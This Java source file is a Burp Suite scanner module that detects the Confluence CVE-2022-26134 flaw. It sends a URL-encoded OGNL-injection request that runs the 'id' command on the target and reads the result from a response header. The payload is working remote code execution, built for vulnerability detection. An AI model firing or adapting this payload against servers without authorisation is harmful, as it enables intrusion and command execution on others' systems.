package burp.scan.active.poc;

import burp.IBurpExtenderCallbacks;
import burp.IScanIssue;
import burp.scan.active.ModuleBase;
import burp.scan.active.ModuleMeta;
import burp.scan.active.feature.Debug;
import burp.scan.active.feature.RunOnce;
import burp.scan.lib.Confidence;
import burp.scan.lib.GtScanIssue;
import burp.scan.lib.Risk;
import burp.scan.lib.utils.Logger;
import burp.scan.lib.web.WebPageInfo;
import burp.scan.lib.web.utils.GtRequest;
import burp.scan.lib.web.utils.GtResponse;
import burp.scan.lib.web.utils.GtSession;
import burp.scan.lib.web.utils.GtURL;
import burp.scan.tags.TagTypes;
import burp.scan.tags.TagUtils;

import java.io.IOException;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;
import java.util.Set;

public class CVE_2022_26134_Confluence_Rule implements ModuleBase, RunOnce, Debug {

    String payload1 = "GET /%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/ HTTP/1.1\n" +
                "Host: %s\n" +
                "Accept-Encoding: gzip, deflate\n" +
                "Accept: */*\n" +
                "Accept-Language: en\n" +
                "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36\n" +
                "Connection: close";

    @Override
    public void scan(IBurpExtenderCallbacks callbacks, WebPageInfo webInfo) {
        var logger = Logger.getLogger(this);
        logger.debug("Starting Module:"+this.getClass());
        var isHttps = new GtURL(webInfo.getUrl()).isHttps();
        GtSession session = new GtSession();
        GtRequest request = new GtRequest(payload1.getBytes(),isHttps);
        try {
            var response = session.sendRequest(request);
            var headers = response.getHeaders();
            for (var header : headers) {
                if (header.contains("X-Cmd-Response")) {
                    IScanIssue issue = new GtScanIssue(
                            response.getRequestResponse().getHttpService(),
                            new GtURL(request.getUrl()).getURL(),
                            response.getRequestResponse(),
                            "Confluence CVE-2022-26134",
                            "Can execute remote command response in X-Cmd-Response",
                            "",
                            Risk.High,
                            Confidence.Certain
                    );
                    webInfo.addIssue(issue);
                    callbacks.addScanIssue(issue);
                }
            }
        } catch (IOException e) {
            logger.error(e.getMessage());
        }
        logger.debug("End Module:"+this.getClass());
    }

    @Override
    public Set<String> getTags() {
        Set<String> res = new HashSet<>();
        res.add(TagUtils.toStandardName(TagTypes.Confluence_Java));
        return res;
    }

    @Override
    public ModuleMeta getMetadata() {
        return null;
    }
}
